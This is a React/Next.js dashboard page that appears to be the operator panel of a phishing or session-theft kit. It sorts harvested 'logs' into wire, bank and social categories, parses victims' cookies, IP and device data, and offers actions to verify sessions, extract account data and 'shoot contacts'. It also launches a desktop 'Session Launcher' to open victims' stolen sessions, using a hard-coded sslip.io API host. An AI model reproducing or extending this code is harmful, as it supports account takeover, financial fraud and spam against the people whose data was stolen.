"use client";

import { useState, useMemo, useEffect } from 'react';
import Link from 'next/link';
import { useAppState } from '../context/AppContext';
import { DashboardTabs } from '../components/admin/dashboard/DashboardTabs';
import { ItemDetailsModal } from '../components/admin/dashboard/ItemDetailsModal';
import { Pagination } from '../components/admin/dashboard/Pagination';
import { WireTable } from '../components/admin/dashboard/wire/WireTable';
import { BankTable } from '../components/admin/dashboard/bank/BankTable';
import { SocialTable } from '../components/admin/dashboard/social/SocialTable';
import LoadingSpinner from '../components/LoadingSpinner';
import { authApi } from '../../utils/auth';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faSync, faChartLine, faDownload } from '@fortawesome/free-solid-svg-icons';

export default function Dashboard() {
  const { appData, setAppData } = useAppState(); // Destructure setAppData
  const [loading, setLoading] = useState(false);
  const [refreshing, setRefreshing] = useState(false); // New state for refresh
  const [selectedItem, setSelectedItem] = useState<string | null>(null);
  const [activeCategory, setActiveCategory] = useState<'WIRE' | 'BANK' | 'SOCIAL' | null>(null);
  const [memoInput, setMemoInput] = useState<{ id: string; text: string } | null>(null);
  const [currentPage, setCurrentPage] = useState(1);
  const [dismissDownload, setDismissDownload] = useState(false);
  const ITEMS_PER_PAGE = 25;

  // Reset to page 1 when category changes
  useEffect(() => {
    setCurrentPage(1);
  }, [activeCategory]);

  // Transform hub data from array format to object format
  const hubData = useMemo(() => {
    if (!appData?.data?.hub?.data || !Array.isArray(appData.data.hub.data)) {
      return [];
    }

    const headers = appData.data.hub.headers || [];
    const rows = appData.data.hub.data.map(row => {
      const item: any = {};
      headers.forEach((header: string, index: number) => {
        if (header) {
          item[header] = row[index];
        }
      });
      
      try {
        if (item.banks) item.banks = JSON.parse(item.banks);
        if (item.socials) item.socials = JSON.parse(item.socials);
        if (item.ipData) item.ipData = JSON.parse(item.ipData);
        if (item.deviceData) item.deviceData = JSON.parse(item.deviceData);
        if (item.cookieJSON) item.cookieJSON = JSON.parse(item.cookieJSON);
      } catch (error) {
        console.warn('Error parsing JSON fields:', error);
      }
      
      return item;
    });

    // Sort by timestamp descending (newest first), fallback to reverse insertion order
    return rows.sort((a, b) => {
      if (a.timestamp && b.timestamp) {
        return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
      }
      return 0;
    });
  }, [appData?.data?.hub]);

  console.log('Processed Hub Data:', hubData);

  const showNoDataMessage = useMemo(() => {
    return !appData?.data?.hub?.data || hubData.length === 0;
  }, [appData?.data?.hub?.data, hubData.length]);

  // Group data by category
  const categorizedData = useMemo(() => {
    return hubData.reduce((acc, item) => {
      const category = item.category as 'WIRE' | 'BANK' | 'SOCIAL';
      if (!acc[category]) acc[category] = [];
      acc[category].push(item);
      return acc;
    }, {} as Record<'WIRE' | 'BANK' | 'SOCIAL', any[]>);
  }, [hubData]);

  // Available categories
  const availableCategories = useMemo(() => {
    return Object.keys(categorizedData).filter(
      cat => categorizedData[cat as keyof typeof categorizedData]?.length > 0
    );
  }, [categorizedData]);

  // Set initial active category if not set
  useEffect(() => {
    if (!activeCategory && availableCategories.length > 0) {
      setActiveCategory(availableCategories[0] as 'WIRE' | 'BANK' | 'SOCIAL');
    }
  }, [availableCategories, activeCategory]);

  const handleRefreshData = async () => {
    setRefreshing(true);
    try {
      await authApi.updateAppData(setAppData);
    } catch (error) {
      console.error('Error refreshing application data:', error);
    } finally {
      setRefreshing(false);
    }
  };

  // Common handlers
  const handleVerify = async (id: string) => {
    setLoading(true);
    try {
      // Find the item to get its category and browserId
      const item = hubData.find((row: any) => row.id === id || row.browserId === id);
      const category = item?.category || 'WIRE';
      const browserId = item?.browserId || id;
      
      await authApi.verifySession(browserId, category);
      // Refresh data after verification
      await authApi.updateAppData(setAppData);
    } catch (error) {
      console.error('Error verifying:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleGetCookie = async (id: string) => {
    setLoading(true);
    try {
      // Implement get cookie functionality
    } catch (error) {
      console.error('Error getting cookie:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const handleExtract = async (id: string) => {
    setLoading(true);
    try {
      // Implement extract functionality based on category
    } catch (error) {
      console.error('Error extracting:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleShootContacts = async (id: string) => {
    setLoading(true);
    try {
      // Implement shoot contacts functionality
    } catch (error) {
      console.error('Error shooting contacts:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleOpenSession = (browserId: string) => {
    const token = document.cookie.match('(^|;)\\s*loggedInAdmin\\s*=\\s*([^;]+)')?.pop();
    if (!token) return;
    const apiUrl = process.env.NEXT_PUBLIC_API_BASE_URL || 'https://webfixx-hoo-oamupo-e98ced-157-173-204-24.sslip.io/api';
    let appOpened = false;
    const onBlur = () => { appOpened = true; };
    const onVisibility = () => { if (document.hidden) appOpened = true; };
    window.addEventListener('blur', onBlur);
    document.addEventListener('visibilitychange', onVisibility);
    window.location.href = `webfixx://launch?browserId=${browserId}&token=${token}&api=${encodeURIComponent(apiUrl)}`;
    setTimeout(() => {
      window.removeEventListener('blur', onBlur);
      document.removeEventListener('visibilitychange', onVisibility);
      if (!appOpened) {
        window.location.href = '/downloads/WebFixx-Session-Launcher-Setup.exe';
      }
    }, 1500);
  };

  const handleMemoSave = async (id: string, text: string) => {
    try {
      // Implement memo save functionality
      setMemoInput(null);
    } catch (error) {
      console.error('Error saving memo:', error);
    }
  };

  const handleRowClick = (id: string) => {
    setSelectedItem(selectedItem === id ? null : id);
  };

  const renderTable = () => {
    if (!activeCategory) return null;

    const allRows = categorizedData[activeCategory] || [];
    const totalPages = Math.ceil(allRows.length / ITEMS_PER_PAGE);
    const startIdx = (currentPage - 1) * ITEMS_PER_PAGE;
    const paginatedData = allRows.slice(startIdx, startIdx + ITEMS_PER_PAGE);

    const commonProps = {
      data: paginatedData,
      onRowClick: handleRowClick,
      selectedId: selectedItem,
      onVerify: handleVerify,
      onGetCookie: handleGetCookie,
      onCopy: handleCopy,
      onExtract: handleExtract,
      onOpenSession: handleOpenSession,
      onMemoSave: handleMemoSave,
      loading,
    };

    const pagination = allRows.length > ITEMS_PER_PAGE ? (
      <Pagination
        currentPage={currentPage}
        totalPages={totalPages}
        totalItems={allRows.length}
        itemsPerPage={ITEMS_PER_PAGE}
        onPageChange={setCurrentPage}
      />
    ) : null;

    switch (activeCategory) {
      case 'WIRE':
        return (
          <>
            <WireTable 
              {...commonProps}
              onShootContacts={handleShootContacts}
            />
            {pagination}
          </>
        );
      case 'BANK':
        return (
          <>
            <BankTable {...commonProps} />
            {pagination}
          </>
        );
      case 'SOCIAL':
        return (
          <>
            <SocialTable 
              {...commonProps}
              onShootContacts={handleShootContacts}
            />
            {pagination}
          </>
        );
      default:
        return null;
    }
  };

  return (
    <>
      {showNoDataMessage ? (
        <div className="flex flex-col items-center justify-center min-h-[calc(100vh-64px)] text-center">
          <FontAwesomeIcon icon={faChartLine} className="w-20 h-20 text-blue-500 mb-6" />
          <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-4">No Data Available</h2>
          <p className="text-lg text-gray-600 dark:text-gray-300 mb-8 max-w-md">
            To unlock the full potential of your dashboard, first visit the <Link href="/projects" className="text-blue-600 hover:underline">Projects page</Link> to create a link and begin collecting data. With active projects, you can automatically validate logs, extract valuable information from accounts, and even initiate targeted campaigns directly from your dashboard.
          </p>
          <Link
            href="/projects"
            className="inline-flex items-center px-4 py-2 border border-transparent text-base font-medium rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700"
          >
            Go to Projects
          </Link>
        </div>
      ) : (
        <div className="p-6">
          <div className="flex justify-between items-center mb-6">
            <button
              onClick={handleRefreshData}
              className="bg-gray-200 dark:bg-gray-700 text-gray-800 dark:text-white px-4 py-2 rounded flex items-center hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors duration-200"
              title="Refresh Data"
              disabled={refreshing}
            >
              <FontAwesomeIcon icon={faSync} className={`text-lg ${refreshing ? 'animate-spin' : ''}`} />
              <span className="ml-2 hidden sm:inline">Get Update</span>
            </button>
            {!dismissDownload && (
              <div className="flex items-center gap-2">
                <a
                  href="/downloads/WebFixx-Session-Launcher-Setup.exe"
                  className="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded flex items-center gap-2 text-sm transition-colors"
                  title="Download Desktop App"
                >
                  <FontAwesomeIcon icon={faDownload} className="text-lg" />
                  <span className="hidden sm:inline">Desktop App</span>
                </a>
                <button
                  onClick={() => setDismissDownload(true)}
                  className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-200 text-lg leading-none"
                  title="Dismiss"
                >
                  ×
                </button>
              </div>
            )}
          </div>

          <DashboardTabs
            categories={availableCategories as ('WIRE' | 'BANK' | 'SOCIAL')[]}
            activeCategory={activeCategory}
            onCategoryChange={setActiveCategory}
          />

          <div className="mt-6">
            {renderTable()}
          </div>

          <ItemDetailsModal
            isOpen={!!selectedItem}
            onClose={() => setSelectedItem(null)}
            data={hubData.find(item => item.id === selectedItem)}
            category={activeCategory}
            onVerify={handleVerify}
            onGetCookie={handleGetCookie}
            onExtract={handleExtract}
            onShootContacts={handleShootContacts}
            onOpenSession={handleOpenSession}
            onMemoSave={handleMemoSave}
            loading={loading}
          />
        </div>
      )}

      {/* Loading State for refresh action */}
      {refreshing && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
          <LoadingSpinner size="large" />
        </div>
      )}
    </>
  );
}
